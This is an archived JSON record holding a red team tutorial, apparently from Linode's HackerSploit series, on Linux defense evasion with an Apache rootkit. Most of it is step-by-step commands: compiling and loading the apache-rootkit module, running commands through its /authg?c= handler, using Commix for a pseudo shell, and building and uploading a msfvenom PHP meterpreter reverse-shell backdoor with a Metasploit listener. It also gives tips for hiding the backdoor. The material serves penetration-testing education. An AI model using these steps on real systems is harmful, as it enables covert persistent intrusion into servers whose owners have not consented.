{
    "id": "5442cbc0-61c1-41bd-8dfe-0843ea1ecb23",
    "created_at": "2023-02-18T02:08:40.196483Z",
    "updated_at": "2025-03-27T02:05:56.113035Z",
    "deleted_at": null,
    "sha1_hash": "b0ff01f8a527a5770371fb50e0f255dd68c6cbd1",
    "title": "2023-01-06 - Linux Red Team Defense Evasion - Rootkits",
    "authors": "",
    "file_creation_date": "2023-02-17T01:39:55Z",
    "file_modification_date": "2023-02-17T01:39:55Z",
    "file_size": 616915,
    "plain_text": "# Linux Red Team Defense Evasion - Rootkits\n\n**[linode.com/docs/guides/linux-red-team-defense-evasion-rootkits](https://www.linode.com/docs/guides/linux-red-team-defense-evasion-rootkits/)**\n\n[Create a Linode account\nto try this guide with a $100 credit.](https://login.linode.com/signup?promo=docs1000822)\nThis credit will be applied to any valid services used during your first\n60 days.\n\n## HackerSploit Red Team Series\n\nThis guide is part of the HackerSploit Red Team series of guides. To navigate to other guides in the\n[series, visit the series’ parent page.](https://www.linode.com/docs/guides/hackersploit-red-team-series/)\n\nImportant\n\nAll labs and tests are to be conducted within the parameters outlined within the text. The use of\nother domains or IP addresses is prohibited.\n\n## Before You Begin\n\nIn order to follow along with the tools and techniques utilized in this document, you will need to use\none of the following offensive Linux distributions:\n\nKali Linux\n\nParrot OS\n\n\n-----\n\nThe following is a list of recommended technical prerequisites that you will need in order to get the\nmost out of this course:\n\nFamiliarity with Linux system administration.\n\nFamiliarity with Windows.\n\nFunctional knowledge of TCP/IP.\n\nFamiliarity with penetration testing concepts and life-cycle.\n\nNote: The techniques and tools utilized in this document were performed on Kali Linux 2021.2\nVirtual Machine\n\n## MITRE ATT&CK Defense Evasion Techniques\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their\ncompromise. Techniques used for defense evasion include uninstalling/disabling security software\nor obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to\nhide and masquerade their malware. Other tactics’ techniques are cross-listed here when those\ntechniques include the added benefit of subverting defenses.\n\n\n-----\n\nThe techniques outlined under the Defense Evasion tactic provide us with a clear and methodical\nway of evading detection on a target system.\n\nThe following is a list of key techniques and sub techniques that we will be exploring:\n\nRootkits\n\n## Scenario\n\nOur objective is to set up an Apache rootkit that will provide us with command injection capabilities\nand consequently backdoor access.\n\n## What is a Rootkit?\n\n\n-----\n\nA rootkit is a clandestine computer program designed to provide continued privileged access to a\ncomputer while actively hiding its presence.\n\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services,\ndrivers, and other system components. Rootkits are programs that hide the existence of malware by\nintercepting/hooking and modifying operating system API calls that supply system information.\n\nRootkits are typically utilized as a part of the defense evasion tactic and are set up after an initial\nfoothold has been obtained.\n\nThe type of rootkit you utilize will depend on the target configuration and your requirements.\n\nThe primary objective of a rootkit is to maintain some form of clandestine access for the attacker.\n\nIn this case, we will be setting up a rootkit in the form of an Apache module that will be used to\nprovide us with backdoor access to the target system.\n\nAs mentioned previously, when it comes to Rootkits and backdoors, simplicity and efficiency is key.\nFurthermore, having an understanding of the various pieces of software installed on the target\nprovides you with an opportunity to utilize one of these services/programs to maintain access.\n\nAdditionally, utilizing software that is installed on the target provides you with anonymity as system\nadministrators or security analysts will find it difficult to detect any anomalies or rogue processes.\n\n## Setting Up apache-rootkit\n\nIn this case, the Linux target that I have compromised is used by the organization to host a website.\nThe website is built on top of the LAMP stack and as a result, Apache2 has been configured to host\nthe website files.\n\nWe can leverage the ability to load Apache2 modules to load our own rootkit module that will\nprovide us with the ability to perform command injection attacks on the webserver and consequently\nspawn a reverse shell.\n\nCommand injection vulnerabilities allow attackers to execute arbitrary commands on the target\noperating system.\n\nTo achieve this, we will be using the apache-rootkit module that can be found here:\n[https://github.com/ChristianPapathanasiou/apache-rootkit](https://github.com/ChristianPapathanasiou/apache-rootkit)\n\nApache-rootkit is a malicious Apache module with rootkit functionality that can be loaded into an\nApache2 configuration with ease and with minimal artifacts.\n\nThe following procedures outline the process of setting up the apache-rootkit module on a target\nLinux system:\n\n\n-----\n\n1. The first step in this process involves installing the Apache2 development kit, this can be done\n\nby running the following command on the target system.\n```\n  sudo apt-get install apache2-dev\n\n\n```\nWe require the Apache2 development kit in order to compile the module source code into a\nshared object.\n\nShared objects are the Windows equivalent of DLLs, they are libraries that are loaded by\nprograms when they are started. They are typically used by programs to extend functionality.\n\n2. Before we clone the apache-rootkit repository, we will need to navigate to the temporary\n\ndirectory on the target system. This can be done by running the following command:\n```\n  cd /tmp\n\n\n```\n3. The next step will involve cloning the apache-rootkit repository on to the target system, this\n\ncan be done by running the following command:\n```\n  git clone https://github.com/ChristianPapathanasiou/apache-rootkit.git\n\n\n```\n4. After cloning the repository you will need to navigate to the “apache-rootkit” directory:\n```\n  cd apache-rootkit\n\n\n```\n5. We can now compile the module by running the following command:\n```\n  apxs -c -i mod_authg.c\n\n\n```\nAs shown in the following screenshot, this will compile the module and copy over the module\nto the /usr/lib/apache2/modules directory.\n\n\n-----\n\n6. The next step will involve loading the mod_authg.so module in the Apache2 configuration\n\nfile, this can be done by running the following command:\n```\n    vim /etc/apache2/apache2.conf\n\n\n```\n7. After which, you will need to add the following configuration at the top of the file to load the\n\nmodule correctly:\n\n**File: /etc/apache2/apache2.conf**\n```\n     LoadModule authg_module\n     /usr/lib/apache2/modules/mod_authg.so\n\n     <Location /authg>\n\n     SetHandler authg\n\n     </Location>\n\n```\n8. After adding the aforementioned configuration, you will need to save the file.\n\n9. After loading the “mod_authg.so” module, you will need to restart the apache2 service, this can\n\nbe done by running the following command:\n```\n    sudo systemctl restart apache2\n\n\n```\nIf you have followed the steps correctly, you shouldn’t receive any errors from systemd.\n\n### Testing apache-rootkit\n\nNow that we have compiled and loaded the apache-rootkit module, we can test the module by\nperforming some command injection techniques.\n\n1. You can perform command injection on the apache2 server by opening the following URL in\n\nyour browser:\n```\n    http://<SERVER-IP>/authg?c=whoami\n\n\n```\nThis URL accesses the apache-rootkit module handler called “authg” and attempts to pass a\nsystem command for execution.\n\n\n-----\n\n2. If the apache-rootkit module works, you should receive the output of the command we\n\nspecified as highlighted in the following screenshot.\n\nNow that we have verified that the module is active and functional, we can utilize it to set up a\nPHP backdoor that will provide us with a meterpreter session whenever executed.\n\n## Exploiting Command Injection with Commix\n\nCommix (short for `[comm]and` `[i]njection` `e[x]ploiter ) is a security testing tool that can be`\nused by web developers, penetration testers, or even security researchers to test web applications\nwith the view to find bugs, errors or vulnerabilities related to command injection attacks. By using\nthis tool, it is very easy to find and exploit a command injection vulnerability in a certain vulnerable\nparameter or string. Commix is written in the Python programming language.\n\n[GitHub Repository: https://github.com/commixproject/commix](https://github.com/commixproject/commix)\n\n\n-----\n\nWe can utilize Commix in conjunction with the apache-rootkit to execute arbitrary commands on the\ntarget system. This can be done by leveraging the inbuilt pseudo shell provided by Commix.\n\n1. The first step in this process involves installing Commix on Kali Linux, this can be done y\n\nrunning the following command:\n```\n    sudo apt-get install commix -y\n\n\n```\n2. After you have installed commix, you can test the target site for command injection\n\nvulnerabilities with Commix by running the following command:\n```\n    commix -u http://<SERVER-IP>/authg?c=whoami\n\n\n```\nCommix will test the URL provided for any command injection vulnerabilities, in this case, it\nwill detect a command injection vulnerability and will ask you whether you want a pseudoterminal shell as shown in the following screenshot.\n\n3. In this case, we will say yes, after which Commix will provide you with the pseudo shell that\n\nyou can use to execute arbitrary commands as shown in the following screenshot.\n\nThis can be very useful during red team engagements as you can easily execute commands on\nthe target system covertly.\n\n## Uploading a PHP Backdoor with Commix\n\nGiven that the target server is running the LAMP stack, we can create a PHP meterpreter payload\nand upload it to the web server as a backdoor with Commix that we can then use to gain access to the\ntarget system whenever required.\n\n1. The first step will involve generating the PHP meterpreter payload with Msfvenom, this can be\n\ndone by running the following command:\n```\n    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.2.21 LPORT=1234 -e php/base64 -f\n   raw > shell.php\n\n```\n\n-----\n\n2. Once you have generated the payload, you will need to modify it by adding the PHP tags so that\n\nthe script is executed correctly as shown in the following screenshot.\n\n3. We can now set up the listener with Metasploit by running the following commands:\n```\n  msfconsole\n\n  use multi/handler\n\n  set payload php/meterpreter/reverse_tcp\n\n  set LHOST <KALI-IP>\n\n  set LPORT <PORT>\n\n  run\n\n\n```\n4. The next step will involve uploading the PHP shell that we just generated to the web server,\n\nthis can be done with Commix by running the following command:\n```\n  commix -u http://<SERVER-IP>/authg?c=id --file-write='/home/kali/Desktop/shell.php' - file-dest='/var/www/html/shell.php\n\n\n```\n5. In this case, we will be uploading the “shell.php” file to the root of the web server, it is\n\nrecommended, however, to upload it to a directory that is not frequently accessed.\n\nIf the “shell.php” file is uploaded successfully, you should receive a message similar to the one\nshown in the screenshot below.\n\n\n-----\n\n6. We can retrieve a meterpreter session on the target by navigating to the shell.php file on the\n\nweb server by accessing the following URL with your browser:\n```\n    http://<SERVER-IP>/shell.php\n\n\n```\nAccessing the through the browser should execute the PHP code and consequently provide you\nwith a meterpreter session on your listener as shown in the following screenshot.\n\nWe have been able to successfully set up the apache-rootkit module and leverage the command\ninjection functionality afforded by the module to execute arbitrary commands on the target\nsystem as well as upload a PHP backdoor that will provide you with a meterpreter session.\n\nThis page was originally published on\nWednesday, November 3, 2021.\n\n\nsecurity\n\n\n## Your Feedback Is Important\n\nLet us know if this guide was helpful to you.\n\nJoin the conversation.\n\nThe Disqus commenting system for Linode Docs requires the acceptance of\nFunctional\nCookies, which allow us to analyze site usage so we can\nmeasure and improve performance.\nTo view and create comments for this\narticle, please\nupdate your Cookie Preferences\non this\nwebsite and refresh this web page. Please note: You must have\nJavaScript enabled in your\nbrowser.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Evasion/2023-01-06 - Linux Red Team Defense Evasion - Rootkits.pdf"
    ],
    "report_names": [
        "2023-01-06 - Linux Red Team Defense Evasion - Rootkits.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1676686120,
    "ts_updated_at": 1743041156,
    "ts_creation_date": 1676597995,
    "ts_modification_date": 1676597995,
    "files": {
        "pdf": "https://archive.orkl.eu/b0ff01f8a527a5770371fb50e0f255dd68c6cbd1.pdf",
        "text": "https://archive.orkl.eu/b0ff01f8a527a5770371fb50e0f255dd68c6cbd1.txt",
        "img": "https://archive.orkl.eu/b0ff01f8a527a5770371fb50e0f255dd68c6cbd1.jpg"
    }
}